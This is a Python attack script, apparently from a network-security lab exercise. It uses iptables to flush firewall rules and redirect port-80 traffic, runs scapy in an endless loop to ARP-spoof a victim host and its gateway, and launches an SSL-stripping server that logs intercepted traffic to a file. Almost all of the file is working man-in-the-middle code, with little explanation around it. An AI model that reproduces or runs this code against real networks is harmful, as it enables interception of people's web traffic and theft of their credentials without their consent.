import os
import subprocess

from multiprocessing import Process
from scapy.all import *
from server import run_server
import signal

def init():
    # commands
    subprocess.Popen('iptables -F', shell=True)
    subprocess.Popen('iptables -F -t nat', shell=True)
    subprocess.Popen('iptables -F -t mangle', shell=True)
    subprocess.Popen('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', shell=True)
    subprocess.Popen('iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT', shell=True)
    subprocess.Popen('iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT', shell=True)
    subprocess.Popen('iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080', shell=True)

def getMac(ip):
    # get the MAC address given an IP address
    # constrct ARP request to send/recieve packet
    (response, unans) = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=False)
    for send,recieve in response:
        return recieve[ARP].hwsrc
    return None
    
def arp_spoof():
    # give credit where credit deserved
    # https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
    
    # define starting gateways
    mallory = "10.0.0.1"
    alice = "10.0.0.2"
    # get MAC
    target = getMac(alice)
    client = getMac(mallory)
    while True:
        send(ARP(pdst=alice, hwdst=target, psrc=mallory), verbose=False)
        send(ARP(hwsrc=client, pdst='10.0.0.1', psrc='10.0.0.2'), verbose=False)
    
    # Use the command arpspoof at first 
    # subprocess.call('arpspoof ...'.split(' ')) 
    #  but the final attack should use scapy to send spoofed ARP packets
    

def ssl_stripping():
    # Use the sslstripping command at first 
    # subprocess.call('python2 /root/sslstrip-0.9/sslstrip.py ...'.split(' '))
    subprocess.call('python3 /shared/server.py -a -w /shared/log.txt -l 8080 -f'.split(' '))
    # run_server()

def run():
    arp_process = Process(target=arp_spoof)
    stripping_process = Process(target=ssl_stripping)
    arp_process.start()
    stripping_process.start()
    stripping_process.join()
    arp_process.terminate()

if __name__ == "__main__":
    init()
    run()
